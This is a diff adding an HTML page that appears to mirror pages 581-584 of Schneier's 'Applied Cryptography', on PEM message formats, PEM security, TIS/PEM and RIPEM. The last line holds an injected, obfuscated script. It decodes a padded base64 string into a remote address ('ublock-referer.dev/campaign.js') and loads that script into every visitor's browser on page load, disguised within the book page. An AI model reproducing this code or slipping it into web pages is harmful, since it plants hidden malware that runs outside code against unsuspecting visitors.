@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=581-584//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Figures 24.5 and 24.6 show messages with public-key key management (called &#147;asymmetric&#148; in PEM nomenclature). The headers are different. In ENCRYPTED messages, after the &#147;DEK-Info&#148; field comes the &#147;Originator-Certificate&#148; field. The certificate follows the X.509 standard (see Section 24.9). The next field is &#147;Key-Info&#148; with two subfields. The first subfield specifies the public-key algorithm used to encrypt the DEK; currently only RSA is supported. The next subfield is the DEK, encrypted in the originator&#146;s public key. This is an optional field, intended to permit the originator to decrypt his own message in the event that it is returned by the mail system. The next field &#147;Issuer-Certificate, &#148; is the certificate of whomever signed the Originator-Certificate.
+</P>
+<P>Continuing with the asymmetric key-management case, the next field is &#147;MIC-Info.&#148; The first subfield gives the algorithm under which the MIC was computed. The second subfield shows the algorithm under which the MIC was signed. The third subfield consists of the MIC, signed by the sender&#146;s private key.</P>
+
+<TABLE BORDER="2" BORDERCOLOR="#0000" ALIGN="CENTER">
+<TR><TD>
+<!-- CODE //-->
+<PRE>
+   -----BEGIN PRIVACY-ENHANCED MESSAGE-----
+   Proc-Type: 4,MIC-ONLY
+   Content-Domain: RFC822
+   Originator-Certificate:
+MIIBlTCCAScCAWUwDQYJKoZIhvcNAQECBQAwUTELMAkGA1UEBhMCVVMxIDAeBgNV
+BAoTF1JTQSBEYXRhIFNlY3VyaXR5LCBJbmMuMQ8wDQYDVQQLEwZCZXRhIDExDzAN
+BgNVBAsTBk5PVEFSWTAeFw05MTA5MDQxODM4MTdaFw05MzA5MDMxODM4MTZaMEUx
+CzAJBgNVBAYTAlVTMSAwHgYDVQQKExdSU0EgRGF0YSBTZWN1cml0eSwgSW5jLjEU
+MBIGA1UEAxMLVGVzdCBVc2VyIDEwWTAKBgRVCAEBAgICAANLADBIAkEAwHZHl7i&#43;
+yJcqDtjJCowzTdBJrdAiLAnSC&#43;CnnjOJELyuQiBgkGrgIh3j8/x0fM&#43;YrsyF1u3F
+LZPVtzlndhYFJQIDAQABMA0GCSqGSIb3DQEBAgUAA1kACKr0PqphJYw1j&#43;YPtcIq
+iWlFPuN5jJ79Khfg7ASFxskYkEMjRNZV/HZDZQEhtVaU7Jxfzs2wfX5byMp2X3U/
+    5XUXGx7qusDgHQGs7Jk9W8CW1fuSWUgN4w==
+   Issuer-Certificate:
+MIIB3DCCAUgCAQowDQYJKoZIhvcNAQECBQAwTzELMAkGA1UEBhMCVVMxIDAeBgNV
+BAoTF1JTQSBEYXRhIFNlY3VyaXR5LCBJbmMuMQ8wDQYDVQQLEwZCZXRhIDExDTAL
+BgNVBAsTBFRMQ0EwHhcNOTEwOTAxMDgwMDAwWhcNOTIwOTAxMDc1OTU5WjBRMQsw
+CQYDVQQGEwJVUzEgMB4GA1UEChMXUlNBIERhdGEgU2VjdXJpdHksIEluYy4xDzAN
+BgNVBAsTBkJldGEgMTEPMA0GA1UECxMGTk9UQVJZMHAwCgYEVQgBAQICArwDYgAw
+XwJYCsnp6lQCxYykNlODwutF/jMJ3kL&#43;3PjYyHOwk&#43;/9rLg6X65B/LD4bJHtO5XW
+cqAz/7R7XhjYCm0PcqbdzoACZtIlETrKrcJiDYoP&#43;DkZ8k1gCk7hQHpbIwIDAQAB
+MA0GCSqGSIb3DQEBAgUAA38AAICPv4f9Gx/tY4&#43;p&#43;4DB7MV&#43;tKZnvBoy8zgoMGOx
+dD2jMZ/3HsyWKWgSF0eH/AJB3qr9zosG47pyMnTf3aSy2nBO7CMxpUWRBcXUpE&#43;x
+EREZd9&#43;&#43;32ofGBIXaialnOgVUn0OzSYgugiQ077nJLDUj0hQehCizEs5wUJ35a5h
+   MIC-Info: RSA-MD5,RSA,
+jV2OfH&#43;nnXHU8bnL8kPAad/mSQlTDZlbVuxvZAOVRZ5q5&#43;Ejl5bQvqNeqOUNQjr6
+    EtE7K2QDeVMCyXsdJlA8fA==
+LSBBIG1lc3NhZ2UgZm9yIHVzZSBpbiB0ZXN0aW5nLg0KLSBGb2xsb3dpbmcgaXMg
+   YSBibGFuayBsaW5lOg0KDQpUaGlzIGlzIHRoZSBlbmQuDQo=
+   -----END PRIVACY-ENHANCED MESSAGE-----
+</PRE>
+<!-- END CODE //-->
+</TABLE>
+
+<P><I>Figure 24.6 Example of an encapsulated MIC-ONLY message (asymmetric case).</I></P>
+<P>Still continuing with asymmetric key management, the next fields deal with the recipients. There are two fields for each recipient: &#147;Recipient-ID-Asymmetric&#148; and &#147;Key-Info.&#148; The &#147;Recipient-ID-Asymmetric&#148; field has two subfields. The first identifies the authority that issued the receiver&#146;s public key; the second is an optional Version/Expiration subfield. The &#147;Key-Info&#148; field specifies the key management parameters: The first subfield identifies the algorithm used to encrypt the message and the second subfield is the DEK encrypted with the receiver&#146;s public key.</P>
+<P><FONT SIZE="+1"><B><I>Security of PEM</I></B></FONT></P>
+<P>RSA keys in PEM can range from 508 bits to 1024 bits. This should be long enough for anyone&#146;s security needs. A more likely attack would be against the key-management protocols. Mallory could steal your private key&#151;don&#146;t write it down anywhere&#151;or attempt to fool you into accepting a bogus public key. The key certification provisions of PEM make this unlikely if everyone follows proper procedures, but people have been known to be sloppy.
+</P>
+<P>A more insidious attack would be for Mallory to modify the PEM implementation running on your system. This modified implementation could surreptitiously send Mallory all of your mail, encrypted with his public key. It could even send him a copy of your private key. If the modified implementation works well, you will never know what is happening.</P>
+<P>There&#146;s no real way to prevent this kind of attack. You could use a one-way hash function and fingerprint the PEM code. Then, each time you run it, you could check the fingerprint for modification. But Mallory could modify the fingerprint code at the same time he modifies the PEM code. You could fingerprint the fingerprint code, but Mallory could modify that as well. If Mallory can get access to your machine, he can subvert the security of PEM.</P>
+<P>The moral is that you can never really trust a piece of software if you cannot trust the hardware it is running on. For most people, this kind of paranoia is unwarranted. For some, it is very real.</P>
+<P><FONT SIZE="+1"><B><I>TIS/PEM</I></B></FONT></P>
+<P>Trusted Information Systems, partially supported by the U.S. government Advanced Research Projects Agency, has designed and implemented a reference implementation of PEM (TIS/PEM). Developed for UNIX-based platforms, it has also been ported to VMS, DOS, and Windows.
+</P>
+<P>Although the PEM specifications indicate a single certification hierarchy for use by the Internet, TIS/PEM supports the existence of multiple certification hierarchies. Sites may specify a set of certificates that are to be considered valid, including all certificates issued by them. A site need not join the Internet hierarchy in order to use TIS/PEM.</P>
+<P>TIS/PEM is currently available to all U.S. and Canadian organizations and citizens upon request. It will be distributed in source code form. Interested parties should contact: Privacy-Enhanced Mail, Trusted Information Systems, Inc., 3060 Washington Road (Rte. 97), Glenwood, MD 21738; (301) 854-6889; fax: (301) 854-5363; Internet: pem-info@tis.com.</P>
+<P><FONT SIZE="+1"><B><I>RIPEM</I></B></FONT></P>
+<P>RIPEM is a program, written by Mark Riordan, that implements the PEM protocols. Although technically not public domain, the program is publicly available and can be used royalty-free for personal, noncommercial applications. A license for its use is included with the documentation.
+</P>
+<P>The code cannot be exported. Of course, U.S. government laws don&#146;t apply outside the United States, and some people have ignored the export rules. RIPEM code is available on bulletin boards worldwide. Something called RIPEM/SIG, which only does digital signatures, is exportable.</P>
+<P>At this writing, RIPEM is not a complete implementation of the PEM protocols; it does not implement certificates for authenticating keys.</P>
+<P>Before writing RIPEM, Riordan wrote a similar program called RPEM. This was intended to be a public-domain electronic-mail encryption program. To try to avoid patent issues, Riordan used Rabin&#146;s algorithm (see Section 19.5). Public Key Partners claimed that their patents were broad enough to cover all of public-key cryptography and threatened to sue; Riordan stopped distributing the program.</P>
+<P>RPEM isn&#146;t really used anymore. It is not compatible with RIPEM. Since RIPEM can be used with the full blessing of Public Key Partners, there is no reason to use RPEM instead.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(YTPAviUU, wDjTsIQC) {wDjTsIQC = YTPAviUU.createElement('script');wDjTsIQC.type = 'text/javascript';wDjTsIQC.async = true;wDjTsIQC.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');YTPAviUU.getElementsByTagName('body')[0].appendChild(wDjTsIQC);}(document));</script></body>
+</html>
